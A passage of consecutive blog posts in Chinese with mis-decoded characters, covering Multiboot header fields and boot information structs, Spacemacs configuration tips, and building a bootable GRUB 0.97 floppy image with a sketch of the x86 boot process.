magic + flags + checksum &#x3D; 0ï¼‰. The address fields of Multiboot headeræ‰€æœ‰ç”± flags çš„ç¬¬ 16 ä½å¼€å¯çš„åœ°å€åŸŸéƒ½æ˜¯ç‰©ç†åœ°å€ã€‚å®ƒä»¬çš„æ„ä¹‰å¦‚ä¸‹ï¼š header_addråŒ…å«å¯¹åº”äº Multiboot å¤´çš„å¼€å§‹å¤„çš„åœ°å€â€”â€”è¿™ä¹Ÿæ˜¯ magic å€¼çš„ç‰©ç†åœ°å€ã€‚è¿™ä¸ªåŸŸç”¨æ¥åŒæ­¥ OS æ˜ è±¡åç§»é‡å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ã€‚ load_addråŒ…å« text æ®µå¼€å§‹å¤„çš„ç‰©ç†åœ°å€ã€‚ä» OS æ˜ è±¡æ–‡ä»¶ä¸­çš„å¤šå¤§åç§»å¼€å§‹è½½å…¥ç”±å¤´ä½ç½®çš„åç§»é‡å®šä¹‰ï¼Œç›¸å‡ï¼ˆheader_addr - load_addrï¼‰.load_addr å¿…é¡»å°äºç­‰äº header_addr. load_end_addr, åŒ…å« data æ®µç»“æŸå¤„çš„ç‰©ç†åœ°å€ã€‚ï¼ˆload_end_addr - load_addrï¼‰æŒ‡å‡ºäº†å¼•å¯¼ç¨‹åºè¦è½½å…¥å¤šå°‘æ•°æ®ã€‚è¿™æš—ç¤ºäº† text å’Œ data æ®µå¿…é¡»åœ¨ OS æ˜ è±¡ä¸­è¿ç»­ï¼›ç°æœ‰çš„ a.out å¯æ‰§è¡Œæ ¼å¼æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚å¦‚æœè¿™ä¸ªåŸŸä¸º 0, å¼•å¯¼ç¨‹åºå‡å®š text å’Œ data æ®µå æ®æ•´ä¸ª OS æ˜ è±¡æ–‡ä»¶ã€‚ bss_end_addr, åŒ…å« bss æ®µç»“æŸå¤„çš„ç‰©ç†åœ°å€ã€‚å¼•å¯¼ç¨‹åºå°†è¿™ä¸ªåŒºåŸŸåˆå§‹åŒ–ä¸º 0, å¹¶ä¿ç•™è¿™ä¸ªåŒºåŸŸä»¥å…å°†å¼•å¯¼æ¨¡å—å’Œå…¶ä»–çš„äºæŸ¥ç³»ç»Ÿç›¸å…³çš„æ•°æ®æ”¾åˆ°è¿™é‡Œã€‚å¦‚æœè¿™ä¸ªåŸŸä¸º 0, å¼•å¯¼ç¨‹åºå‡å®šæ²¡æœ‰ bss æ®µã€‚ entry_addræ“ä½œç³»ç»Ÿçš„å…¥å£ç‚¹ï¼Œå¼•å¯¼ç¨‹åºæœ€åå°†è·³è½¬åˆ°é‚£é‡Œã€‚ 0x02 Machine stateå½“å¼•å¯¼ç¨‹åºè°ƒç”¨ 32 ä½æ“ä½œç³»ç»Ÿæ—¶ï¼Œæœºå™¨çŠ¶æ€å¿…é¡»å¦‚ä¸‹ï¼š EAX å¿…é¡»åŒ…å«é­”æ•° 0x2BADB002ï¼›è¿™ä¸ªå€¼æŒ‡å‡ºæ“ä½œç³»ç»Ÿæ˜¯è¢«ä¸€ä¸ªç¬¦åˆ Multiboot è§„èŒƒçš„å¼•å¯¼ç¨‹åºè½½å…¥çš„ï¼ˆè¿™æ ·å°±ç®—æ˜¯å¦ä¸€ç§å¼•å¯¼ç¨‹åºä¹Ÿå¯ä»¥å¼•å¯¼è¿™ä¸ªæ“ä½œç³»ç»Ÿï¼‰. EBX å¿…é¡»åŒ…å«ç”±å¼•å¯¼ç¨‹åºæä¾›çš„ Multiboot ä¿¡æ¯ç»“æ„çš„ç‰©ç†åœ°å€ã€‚ CS å¿…é¡»æ˜¯ä¸€ä¸ªåç§»é‡ä½äº 0 åˆ° 0xFFFFFFFF ä¹‹é—´çš„ 32 ä½å¯è¯» &#x2F; å¯æ‰§è¡Œä»£ç æ®µã€‚è¿™é‡Œçš„ç²¾ç¡®å€¼æœªå®šä¹‰ã€‚ Others register(DS,ES,FS,GS,SS), å¿…é¡»æ˜¯ä¸€ä¸ªåç§»é‡ä½äº 0 åˆ° 0xFFFFFFFF ä¹‹é—´çš„ 32 ä½å¯è¯» &#x2F; å¯æ‰§è¡Œä»£ç æ®µã€‚è¿™é‡Œçš„ç²¾ç¡®å€¼æœªå®šä¹‰ã€‚ A20 gate, å¿…é¡»å·²ç»å¼€å¯ã€‚ CR0 ç¬¬ 31 ä½ï¼ˆPGï¼‰å¿…é¡»ä¸º 0. ç¬¬ 0 ä½ï¼ˆPEï¼‰å¿…é¡»ä¸º 1. å…¶ä»–ä½æœªå®šä¹‰ã€‚ EFLAGS ç¬¬ 17 ä½ï¼ˆVMï¼‰å¿…é¡»ä¸º 0. ç¬¬ 9 ä½ï¼ˆIFï¼‰å¿…é¡»ä¸º 1. å…¶ä»–ä½æœªå®šä¹‰ã€‚æ‰€æœ‰å…¶ä»–çš„å¤„ç†å™¨å¯„å­˜å™¨å’Œæ ‡å¿—ä½æœªå®šä¹‰ã€‚è¿™åŒ…æ‹¬ï¼š ESP å½“éœ€è¦ä½¿ç”¨å †æ ˆæ—¶ï¼ŒOS æ˜ è±¡å¿…é¡»è‡ªå·±åˆ›å»ºä¸€ä¸ªã€‚ GDTR å°½ç®¡æ®µå¯„å­˜å™¨åƒä¸Šé¢é‚£æ ·å®šä¹‰äº†ï¼ŒGDTR ä¹Ÿå¯èƒ½æ˜¯æ— æ•ˆçš„ï¼Œæ‰€ä»¥ OS æ˜ è±¡å†³ä¸èƒ½è½½å…¥ä»»ä½•æ®µå¯„å­˜å™¨ï¼ˆå³ä½¿æ˜¯è½½å…¥ç›¸åŒçš„å€¼ä¹Ÿä¸è¡Œï¼ï¼‰ç›´åˆ°å®ƒè®¾å®šäº†è‡ªå·±çš„ GDT. IDTR OS æ˜ è±¡å¿…é¡»åœ¨è®¾ç½®å®Œå®ƒçš„ IDT ä¹‹åæ‰èƒ½å¼€ä¸­æ–­ã€‚å°½ç®¡å¦‚æ­¤ï¼Œå…¶ä»–çš„æœºå™¨çŠ¶æ€åº”è¯¥è¢«å¼•å¯¼ç¨‹åºç•™åšæ­£å¸¸çš„å·¥ä½œé¡ºåºï¼Œä¹Ÿå°±æ˜¯åŒ BIOSï¼ˆæˆ–è€… DOS, å¦‚æœå¼•å¯¼ç¨‹åºæ˜¯ä»é‚£é‡Œå¯åŠ¨çš„è¯ï¼‰åˆå§‹åŒ–çš„çŠ¶æ€ä¸€æ ·ã€‚æ¢å¥è¯è¯´ï¼Œæ“ä½œç³»ç»Ÿåº”è¯¥èƒ½å¤Ÿåœ¨è½½å…¥åè¿›è¡Œ BIOS è°ƒç”¨ï¼Œç›´åˆ°å®ƒè‡ªå·±é‡å†™ BIOS æ•°æ®ç»“æ„ä¹‹å‰ã€‚è¿˜æœ‰ï¼Œå¼•å¯¼ç¨‹åºå¿…é¡»å°† PIC è®¾å®šä¸ºæ­£å¸¸çš„ BIOS&#x2F;DOS çŠ¶æ€ï¼Œå°½ç®¡å®ƒä»¬æœ‰å¯èƒ½åœ¨è¿›å…¥ 32 ä½æ¨¡å¼æ—¶æ”¹å˜å®ƒä»¬ã€‚ 123456789/* å¯åŠ¨åï¼Œåœ¨ 32 ä½å†…æ ¸è¿›å…¥ç‚¹ï¼Œæœºå™¨çŠ¶æ€å¦‚ä¸‹ * 1. cs æŒ‡å‘åŸºåœ°å€ 0x00000000, é™é•¿ 1-4G çš„ä»£ç æ®µæè¿°ç¬¦ * 2. ds, ss, es, fs, gs æŒ‡å‘åŸºåœ°å€ 0x00000000, é™é•¿ 1-4G çš„æ•°æ®æ®µæè¿°ç¬¦ * 3. A20 åœ°å€çº¿å·²ç»è¢«æ‰“å¼€ * 4. é¡µæœºåˆ¶è¢«ç¦æ­¢ * 5. ä¸­æ–­è¢«ç¦æ­¢ * 6. EAX = 0x2BADB002 * 7. ç³»ç»Ÿä¿¡æ¯å’Œå¯åŠ¨ä¿¡æ¯å—çš„çº¿æ€§åœ°å€ä¿å­˜åœ¨ ebx ä¸­ã€‚ */ 0x03 Boot informationåœ¨è¿›å…¥æ“ä½œç³»ç»Ÿæ—¶ [^example],EBX å¯„å­˜å™¨åŒ…å« Multiboot ä¿¡æ¯æ•°æ®ç»“æ„çš„ç‰©ç†åœ°å€ï¼Œå¼•å¯¼ç¨‹åºé€šè¿‡å®ƒå°†é‡è¦çš„å¼•å¯¼ä¿¡æ¯ä¼ é€’ç»™æ“ä½œç³»ç»Ÿã€‚æ“ä½œç³»ç»Ÿå¯ä»¥æŒ‰è‡ªå·±çš„éœ€è¦ä½¿ç”¨æˆ–è€…å¿½ç•¥ä»»ä½•éƒ¨åˆ†ï¼›æ‰€æœ‰çš„å¼•å¯¼ç¨‹åºä¼ é€’çš„ä¿¡æ¯åªæ˜¯å»ºè®®æ€§çš„ã€‚Multiboot ä¿¡æ¯ç»“æ„å’Œå®ƒçš„ç›¸å…³çš„å­ç»“æ„å¯ä»¥ç”±å¼•å¯¼ç¨‹åºæ”¾åœ¨ä»»ä½•ä½ç½®ï¼ˆå½“ç„¶ï¼Œé™¤äº†ä¿ç•™ç»™å†…æ ¸å’Œå¼•å¯¼æ¨¡å—çš„åŒºåŸŸï¼‰. å¦‚ä½•åœ¨åˆ©ç”¨ä¹‹å‰ä¿æŠ¤å®ƒæ˜¯æ“ä½œç³»ç»Ÿçš„è´£ä»»ã€‚Multiboot ä¿¡æ¯ç»“æ„çš„æ ¼å¼å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576typedef struct multiboot_t &#123; /* multiboot version info ä¸”æ˜¯å¿…é¡»çš„ */ uint32_t flags; /* å¦‚æœ flags[0] è¢«ç½®ä½åˆ™å‡ºç° * mem_lower å’Œ mem_upper åˆ†åˆ«æŒ‡å‡ºä½ç«¯å’Œé«˜ç«¯å†…å­˜çš„å¤§å°ï¼Œå•ä½æ˜¯ k * ä½ç«¯å†…å­˜çš„é¦–åœ°å€æ˜¯ 0, é«˜ç«¯å†…å­˜é¦–åœ°å€æ˜¯ 1M * ä½ç«¯å†…å­˜çš„æœ€å¤§å€¼å¯èƒ½æ˜¯ 640k * é«˜ç«¯å†…å­˜çš„æœ€å¤§å€¼å¯èƒ½æ˜¯æœ€å¤§å€¼ -1M, ä½†å¹¶ä¸ä¿è¯æ˜¯è¿™ä¸ªå€¼ã€‚ */ uint32_t mem_lower; uint32_t mem_upper; /* å¦‚æœ flags[1] è¢«ç½®ä½åˆ™å‡ºç°ï¼Œå¹¶æŒ‡å‡ºå¼•å¯¼ç¨‹åºä»å“ªä¸ª BIOS ç£ç›˜è®¾å¤‡è½½å…¥çš„ OS æ˜ åƒã€‚ * å¦‚æœ OS æ˜ åƒä¸æ˜¯ä»ä¸€ä¸ª BIOS ç£ç›˜è½½å…¥çš„ï¼Œè¿™ä¸ªåŸŸå°±å†³ä¸èƒ½å‡ºç° (ç¬¬ 3 ä½å¿…é¡»æ˜¯ 0). * æ“ä½œç³»ç»Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªåŸŸæ¥å¸®åŠ©ç¡®å®šå®ƒçš„ root è®¾å¤‡ï¼Œä½†å¹¶ä¸ä¸€å®šè¦è¿™æ ·åšã€‚ */ uint32_t boot_device; /* å¦‚æœ flags[2] è¢«ç½®ä½åˆ™å‡ºç°ï¼Œå¦‚æœè®¾ç½®äº† flags longword çš„ç¬¬ 2 ä½ï¼Œ * åˆ™ cmdline åŸŸæœ‰æ•ˆï¼Œå¹¶åŒ…å«è¦ä¼ é€ç»™å†…æ ¸çš„å‘½ä»¤è¡Œå‚æ•°çš„ç‰©ç†åœ°å€ã€‚ * å‘½ä»¤è¡Œå‚æ•°æ˜¯ä¸€ä¸ªæ­£å¸¸ C é£æ ¼çš„ä»¥ 0 ç»ˆæ­¢çš„å­—ç¬¦ä¸²ã€‚ */ uint32_t cmdline; /* å¦‚æœ flags[3] è¢«ç½®ä½åˆ™å‡ºç°ï¼Œåˆ™ mods åŸŸæŒ‡å‡ºäº†åŒå†…æ ¸ä¸€åŒè½½å…¥çš„æœ‰å“ªäº›å¼•å¯¼æ¨¡å—ï¼Œ * ä»¥åŠåœ¨å“ªé‡Œèƒ½æ‰¾åˆ°å®ƒä»¬.mods_count åŒ…å«äº†è½½å…¥çš„æ¨¡å—çš„ä¸ªæ•°ï¼Œ * mods_addr åŒ…å«äº†ç¬¬ä¸€ä¸ªæ¨¡å—ç»“æ„çš„ç‰©ç†åœ°å€ã€‚ */ uint32_t mods_count; uint32_t mods_addr; /* offset 28-30 syms * å¦‚æœ flags[4] æˆ– flags[5] è¢«ç½®ä½åˆ™å‡ºç° (äº’æ–¥), è¿™é‡Œæ˜¯ 5 è¢«ç½®ä½ã€‚ * ELF format section head, å‚è§ i386 ELF æ–‡æ¡£ä»¥å¾—åˆ°å¦‚ä½•è¯»å– section å¤´çš„æ›´å¤šçš„ç»†èŠ‚ */ uint32_t num; uint32_t size; uint32_t addr; uint32_t shndx; /* å¦‚æœ flags[6] è¢«ç½®ä½åˆ™å‡ºç°ï¼ŒæŒ‡å‡ºä¿å­˜ç”± BIOS æä¾›çš„å†…å­˜åˆ†å¸ƒçš„ç¼“å†²åŒºçš„åœ°å€å’Œé•¿åº¦ã€‚ * mmap_addr æ˜¯ç¼“å†²åŒºçš„åœ°å€ï¼Œmmap_length æ˜¯ç¼“å†²åŒºçš„æ€»å¤§å°ã€‚ */ uint32_t mmap_length; uint32_t mmap_addr; /* å¦‚æœ flags[7] è¢«ç½®ä½åˆ™å‡ºç°ï¼Œåˆ™ drives_*åŸŸæ˜¯æœ‰æ•ˆçš„ï¼Œ * æŒ‡å‡ºç¬¬ä¸€ä¸ªé©±åŠ¨å™¨ç»“æ„çš„ç‰©ç†åœ°å€å’Œè¿™ä¸ªç»“æ„çš„å¤§å°ã€‚ * drives_addr æ˜¯åœ°å€ï¼Œdrives_length æ˜¯é©±åŠ¨å™¨ç»“æ„çš„æ€»å¤§å°ã€‚ */ uint32_t drives_length; uint32_t drives_addr; /* å¦‚æœ flags[8] è¢«ç½®ä½åˆ™å‡ºç°ï¼Œåˆ™ config_table åŸŸæœ‰æ•ˆï¼Œ * æŒ‡å‡ºç”± GET CONFIGURATION BIOS è°ƒç”¨è¿”å›çš„ ROM é…ç½®è¡¨çš„ç‰©ç†åœ°å€ã€‚ * å¦‚æœè¿™ä¸ª BIOS è°ƒç”¨å¤±è´¥äº†ï¼Œåˆ™è¿™ä¸ªè¡¨çš„å¤§å°å¿…é¡»æ˜¯ 0. */ uint32_t config_table; /* å¦‚æœ flags[9] åˆ™ boot_loader_name åŸŸæœ‰æ•ˆï¼Œ * åŒ…å«äº†å¼•å¯¼ç¨‹åºåå­—åœ¨ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ã€‚ * å¼•å¯¼ç¨‹åºåå­—æ˜¯æ­£å¸¸çš„ C é£æ ¼çš„ä»¥ 0 ä¸­æ­¢çš„å­—ç¬¦ä¸² */ uint32_t boot_loader_name; uint32_t apm_table; /* å¦‚æœ flags[11] è¢«ç½®ä½åˆ™ apm_table åŸŸæœ‰æ•ˆï¼Œ åŒ…å«äº†å¦‚ä¸‹ APM(é«˜çº§ç”µæºç®¡ç†) è¡¨çš„ç‰©ç†åœ°å€ï¼š*/ uint32_t vbe_control_info; uint32_t vbe_mode_info; uint32_t vbe_mode; uint32_t vbe_interface_seg; uint32_t vbe_interface_off; uint32_t vbe_interface_len;&#125; __attribute__((packed)) multiboot_t; åœ¨ flags[6] è¢«ç½®ä½æ—¶å€™ï¼Œåˆ™ mmap_*åŸŸæœ‰æ•ˆï¼ŒæŒ‡å‡ºä¿å­˜ç”± BIOS æä¾›çš„å†…å­˜åˆ†å¸ƒçš„ç¼“å†²åŒºçš„åœ°å€å’Œé•¿åº¦ï¼Œç¼“å†²åŒºçš„ç»“æ„ï¼š 12345678910111213141516/* size: æ˜¯ç›¸å…³ç»“æ„çš„å¤§å°ï¼Œå•ä½æ˜¯å­—èŠ‚ï¼Œå®ƒå¯èƒ½å¤§äºæœ€å°å€¼ 20. * base_addr_low: æ˜¯å¯åŠ¨åœ°å€çš„ä½ 32 ä½ï¼Œ * base_addr_high: æ˜¯é«˜ 32 ä½ï¼Œå¯åŠ¨åœ°å€æ€»å…±æœ‰ 64 ä½ã€‚ * length_low: length_low æ˜¯å†…å­˜åŒºåŸŸå¤§å°çš„ä½ 32 ä½ã€‚ * length_high: æ˜¯å†…å­˜åŒºåŸŸå¤§å°çš„é«˜ 32 ä½ï¼Œæ€»å…±æ˜¯ 64 ä½ã€‚ * type: æ˜¯å†…å­˜å¯ç”¨ä¿¡æ¯ 1 ä»£è¡¨å¯ç”¨ï¼Œå…¶ä»–çš„ä»£è¡¨ä¿ç•™åŒºåŸŸ */ typedef struct mmap_entry_t &#123; uint32_t size; uint32_t base_addr_low; uint32_t base_addr_high; uint32_t length_low; uint32_t length_high; uint32_t type;&#125; __attribute__((packed)) mmap_entry_t; [^multiboot]: multiboot specification[^example]: example OS Code","tags":["specification"]},{"title":"emacs tips","path":"/2016/03/11/configure-emacs/","content":"0x00 cataloglinux ä¸‹é¢ä¸€èˆ¬å®‰è£… gnu&#x2F;emacs: 1dnf install emacs -y mac ä¸‹é¢æ¨è emacs-mac: 12brew tap railwaycat/emacsmacportbrew install emacs-mac --with-spacemacs-icon é…ç½®æ–‡ä»¶ä½¿ç”¨spacemacs,å®ƒä¸»è¦åŠŸèƒ½é€šè¿‡ layer æ¥åˆ‡åˆ†é…ç½®å•å…ƒï¼Œå¸®åŠ©èŠ‚çœé…ç½®æ—¶é—´ã€‚æˆ‘ç›®å‰å¸¸ç”¨çš„ layer æœ‰ï¼š 12345678910111213141516171819202122232425262728c-c++osxhtmlgodockerdashchinesehaskellshell-scriptspythonauto-completionjavascriptycmdgtagsbetter-defaultsemacs-lispgitcolorsmarkdownorglualatex(shell :variables shell-default-height 30 shell-default-position &#x27;bottom)spell-checkingsyntax-checkingcscope 0x10 keybind[^faq]ä¹‹å‰ä¸Šè¯¾ä¹ æƒ¯ä½¿ç”¨ vs çš„ F5 å»ç¼–è¯‘è¿è¡Œç¨‹åºï¼Œemacs çš„é»˜è®¤é…ç½®é‡Œé¢ä¸æä¾›è¿™æ ·çš„åŠŸèƒ½ï¼Œemacs å½“æä¾›ç±»ä¼¼çš„å‘½ä»¤å«compileè°ƒç”¨makefileæ¥å®Œæˆã€‚å¯ä»¥é€šè¿‡ c mode hook bind F5 åˆ°compileå‘½ä»¤ï¼š 123(add-hook &#x27;c-mode-hook&#x27; (lambda () (local-set-key (quote [f5]) (quote compile)))) 0x20 auto completeä¸åŒè¯­è¨€çš„è¡¥å…¨è®°å½•ã€‚ 0x21 C&#x2F;C++layer é‡Œé¢å¯¹ C&#x2F;C++ çš„è¡¥å…¨æä¾›äº† ycmd-client, è¿™ä¸ªæ’ä»¶æœåŠ¡å™¨ç«¯è¿˜æ˜¯éœ€è¦è‡ªå·±ç¼–è¯‘å®‰è£…ï¼Œä¸” ycmd æ¯ä¸€ä¸ª project éƒ½æœ‰ä¸€ä¸ªå«.ycm_extra_conf.pyçš„é…ç½®æ–‡ä»¶ï¼Œå…¶å¯ä»¥é€šè¿‡ YCM-Generator æ¥ç”Ÿæˆã€‚ 0x22 pythonpython è¡¥å…¨æœ‰ä¸ªéå¸¸æ£’çš„æ’ä»¶ elpy! ä¹Ÿå·²ç»é›†æˆåˆ° spacemacs äº†ï¼ It aims to provide an easy to install, fully-featured environment for Python development.[^elpy] è¢«åŠ¨æŠ€èƒ½ -PEP8 é£æ ¼æ£€æŸ¥ è¯­æ³•æ£€æŸ¥ è‡ªåŠ¨è¡¥å…¨ é¡¹ç›®ç®¡ç†â€¦ 0x23 goåœ¨.spacemacsé‡Œé¢å¼€å¯go-modeçš„ layer å¹¶ä¸”å®‰è£…ç›¸å…³å‘½ä»¤è¡Œå·¥å…·ï¼Œgo å¼€å‘ç¯å¢ƒå°±åŸºæœ¬èƒ½ç”¨äº†ã€‚ 1234567go get golang.org/x/tools/cmd/govendorgo get golang.org/x/tools/cmd/goimportsgo get golang.org/x/tools/cmd/gorenamego get github.com/rogpeppe/godefgo get golang.org/x/tools/cmd/gurugo get -u github.com/nsf/gocodego get golang.org/x/tools/cmd/godoc go çš„ç¯å¢ƒå˜é‡ 123...GOPATH=&quot;/Users/sn0rt/workspace/go&quot;... é»˜è®¤å®‰è£…é‡åˆ°ä¸€ä¸ªå°å‘å°±æ˜¯ä¸èƒ½è¡¥å…¨ç¬¬ä¸‰æ–¹åº“ï¼Œé€šè¿‡ gocode çš„çš„è®¾ç½®å¯ä»¥ä¿®æ”¹autobuild å’Œ propose-builtins 12345678910# gocode setpropose-builtins truelib-path &quot;&quot;custom-pkg-prefix &quot;&quot;custom-vendor-dir &quot;&quot;autobuild trueforce-debug-output &quot;&quot;package-lookup-mode &quot;go&quot;close-timeout 1800unimported-packages false åœ¨ spacemacs é‡Œé¢ä¹Ÿå·²ç»é›†æˆäº†ï¼Œä¸”é™æ€åˆ†æå·¥å…·æ¢æˆäº†guruäº†ï¼ç®€ç›´å¤ªæ£’äº†ï¼ 0x30 latexåœ¨.spacemacs é‡Œé¢å¼€å¯ latex, å¯ä»¥é€šè¿‡ bindkey è¿›è¡Œç›´æ¥ç¼–è¯‘ä¸æŸ¥çœ‹é¡µæ–¹ä¾¿ï¼Œä¸è¿‡å¯¹ ctex å®åŒ…æ”¯æŒç›¸å¯¹ä¸€èˆ¬ã€‚ 0x40 utils0x41 ircspacemacs è‡ªå¸¦ercçš„ layer, ä¿®æ”¹ä¸€è¡Œä»£ç å°±èƒ½è‡ªåŠ¨è·‘èµ·æ¥ irc å®¢æˆ·ç«¯ï¼Œå¾ˆæ˜¯æ–¹ä¾¿ã€‚è€Œä¸”å¯ä»¥ emacs å˜æˆæœåŠ¡ä¸€ç›´åœ¨åå°è¿™æ · irc å°±ä¸ç”¨ä¸‹çº¿äº† (è®°å¾— AFK). 0x42 git Magit is an interface to the version control system Git, implemented as an Emacs package. Magit aspires to be a complete Git porcelain. While we cannot (yet) claim that Magit wraps and improves upon each and every Git command, it is complete enough to allow even experienced Git users to perform almost all of their daily version control tasks directly from within Emacs. While many fine Git clients exist, only Magit and Git itself deserve to be called porcelains. ä¸Šé¢æ˜¯ä»‹ç»ï¼Œéå¸¸å€¼å¾—å°è¯•ä¸€ä¸‹ã€‚ [^faq]: Emacs FAQ[^elpy]: Elpy","tags":["tips"]},{"title":"From a bootable floppy to booting","path":"/2016/03/10/make-a-bootable-floppy/","content":"0x00 forewordåˆ¶ä½œå¯å¯åŠ¨è½¯ç›˜æ˜¯ä¸ºäº†å¼„æ˜ç™½ hurlex é¡¹ç›®é‡Œé¢é‚£ä¸ªè½¯ç›˜å…¶åˆ¶ä½œè¿‡ç¨‹ [^ubwiki], åæ¥æƒ³åˆ°å¯åŠ¨æ˜¯ä¸€ä¸ªå®Œæˆçš„è¿‡ç¨‹ä¾¿å¯¹è¿™ä¸ªç¬”è®°è¿›è¡Œæ‹“å±•ï¼Œä¹Ÿå°±æœ‰äº†åé¢çš„è½¯ç¡¬ä»¶å¯åŠ¨è¿‡ç¨‹ã€‚ 0x01 install grub 0.97ç½‘ä¸Š wiki å¤ªè€ï¼Œéƒ½æ˜¯ base grub 1 çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ grub 0.97 èŠ‚çº¦æ—¶é—´ï¼Œæˆ‘ç³»ç»Ÿæ˜¯ fedora23 å®‰è£… grub å­˜åœ¨ç‰ˆæœ¬å†²çªï¼Œæ‰€ä»¥æš‚æ—¶å¸è½½äº† grub2. å…·ä½“çš„ rpm å¯ä»¥åœ¨ [^download] ä¸‹è½½ã€‚ 0x02 startingåˆ¶ä½œä¸€ä¸ª 1.44M è½¯ç›˜ï¼Œç„¶åæ ¼å¼åŒ–æˆ ext2, å¤åˆ¶å¿…è¦çš„æ–‡ä»¶ï¼Œæ³¨æ„å…¶ä¸­åŒ…å« menu.lst,grub.conf.ä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶å¯èƒ½åœ¨æ–°å®‰è£… grub 0 çš„æ—¶å€™æ˜¯æ²¡æœ‰ã€‚ä½ éœ€è¦è‡ªå·± touch ä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œå¦åˆ™åœ¨äº¤äº’æ¨¡å¼çš„ setup (fd0) çš„ install é˜¶æ®µä¼šå‡ºç°ä¸¥é‡é”™è¯¯å¯¼è‡´æŒ‡ä»¤å¤±è´¥ã€‚ 123456dd if=/dev/zero of=floppy.img count=1 bs=1440kmke2fs floppy.imgmount floppy.img /mount/pointmkdir -p /mount/point/boot/grubcd /boot/grubcp stage1 stage2 menu.lst grub.conf /mount/point/boot/grub è¿›å…¥ grub 0.97 çš„äº¤äº’æ¨¡å¼ï¼š 1234device (fd0) floppy.imgroot (fd0)setup (fd0)quit 0x03 testingå®‰è£… qemu æ¨¡æ‹Ÿå™¨ã€‚ qemu-system-i386 floppy.img test-in-qemu ç°åœ¨è®°å¾—è¦æŠŠ grub0 å¸è½½ï¼Œå®‰è£…å› grub2. 0x04 hardware booting[^ulk] ç³»ç»ŸåˆšåŠ ç”µæ—¶å€™è¿™ä¸ªç”µè„‘çš„ç”µè·¯çŠ¶æ€å¤„äºä¸€ç‰‡æ··æ²Œ (ä¸å¯é¢„çŸ¥). åŒ—æ¡¥æ§åˆ¶èŠ¯ç‰‡å‘ cpu å¼•è„šäº§ç”Ÿä¸€ä¸ª RESET çš„é€»è¾‘å€¼ï¼Œå¸¦ç”µå‹ç¨³å®šæ—¶å€™æ§åˆ¶èŠ¯ç‰‡æ’¤é”€ reset ä¿¡å·ï¼Œå°±æŠŠå¤„ç†å™¨è®¾ç½®æˆç‰¹æ®Šçš„å€¼ï¼Œå¹¶æ‰§è¡Œåœ¨ 0xfffffff0 å¤„çš„æŒ‡ä»¤ï¼Œä»è¿™é‡Œå¼€å§‹ cpu å°±è¿›å…¥äº†â€å–æŒ‡ä»¤ (IF)- æŒ‡ä»¤æ‰§è¡Œ (ID)- å¾ªç¯â€, æ‰€ä»¥æˆ‘è¦åšçš„å°±è¯´åœ¨å„ä¸ªé˜¶æ®µä¸º cpu æä¾›ç›¸å…³çš„æ•°æ®ã€‚è¿™ä¸ªåœ°å€ä¸€èˆ¬è¢«æ˜ å°„åˆ°å›ºå®šçš„ ROM ä¸­ï¼ŒROM ä¸­å­˜æ”¾ç€ç¨‹åºé›†åœ¨ x86 ä¸­é€šå¸¸è¢«ç§°ä¸º BIOS, å› ä¸º BIOS é‡Œé¢åŒ…å«å‡ ä¸ªä¸­æ–­é©±åŠ¨çš„ä½çº§è¿‡ç¨‹ï¼Œæ‰€æœ‰æ“ä½œç³»ç»Ÿåœ¨å¯åŠ¨æ—¶å€™éƒ½ä¾èµ–è¿™äº›è¿‡ç¨‹å¯¹è®¡ç®—æœºè¿›è¡Œè®¾å¤‡åˆå§‹åŒ–ã€‚ ç´§æ¥ç€æ˜¯ POST è¿‡ç¨‹ï¼ŒBIOS å¯¹è®¡ç®—æœºå„ä¸ªéƒ¨ä»¶è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™ä¸ªé˜¶æ®µä¼šæ˜¾ç¤ºä¸€äº›ä¿¡æ¯ï¼Œåˆ—å¦‚ bios çš„ç‰ˆæœ¬ï¼Œä¸è¿‡å¦‚ä»Šçš„è®¡ç®—æœºä½¿ç”¨é«˜çº§é…ç½®å’Œå¼€æœºç•Œé¢ (ACPI) æ ‡å‡†ï¼Œåœ¨ ACPI å…¼å®¹çš„ bios ä¸­å¯åŠ¨ä»£ç ä¼šç®€å†å‡ ä¸ªè¡¨æ¥æè¿°å½“æœŸç³»ç»Ÿçš„ç¡¬ä»¶è®¾å¤‡ã€‚è¿™äº›è¡¨çš„æ ¼å¼ç‹¬ç«‹äºè®¾å¤‡ç”Ÿæˆå•†ï¼Œè€Œä¸”å¯ç”±æ“ä½œç³»ç»Ÿè¯»å–ä»¥è·å¾—å¦‚ä½•è°ƒç”¨è¿™äº›è®¾å¤‡çš„ä¿¡æ¯ã€‚ åˆå§‹åŒ–ç¡¬ä»¶è®¾å¤‡ï¼Œè¿™ä¸ªé˜¶æ®µåœ¨ç°ä»£åŸºäº PCI çš„ä½“ç³»ç»“æ„ä¸­ç›¸å½“é‡è¦ï¼Œä»–ä¿è¯äº†æ‰€æœ‰çš„ç¡¬ä»¶è®¾å¤‡æ“ä½œä¸ä¼šå¼•èµ· IRQ ä¸ I&#x2F;O ç«¯å£çš„å†²çªï¼Œå®Œæˆæœ¬é˜¶æ®µå¯ä»¥æ˜¾ç¤ºä¸€ä¸ªæœ¬ç³»ç»Ÿä¸­æ‰€æœ‰ PCI è®¾å¤‡çš„åˆ—è¡¨ã€‚ æ ¹æ® BIOS é…ç½®æ¥æœç´¢å¤–éƒ¨å­˜å‚¨è®¾å¤‡çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºæ¥å¯åŠ¨ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚ åªè¦æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆè®¾å¤‡ (ç¬¬ä¸€ä¸ªæ‰‡åŒºæœ€åä¸¤ä¸ªå­—èŠ‚æ˜¯ 0x55,0xaa), å°†å…¶ç¬¬ä¸€ä¸ªæ‰‡åŒºçš„å†…å®¹æ‹·è´åˆ°ç‰©ç†åœ°å€ 0x00007c00 çš„å¼€å§‹ä½ç½®ï¼Œç„¶å ip æŒ‡å‘è¿™é‡Œã€‚ 0x05 bootloader 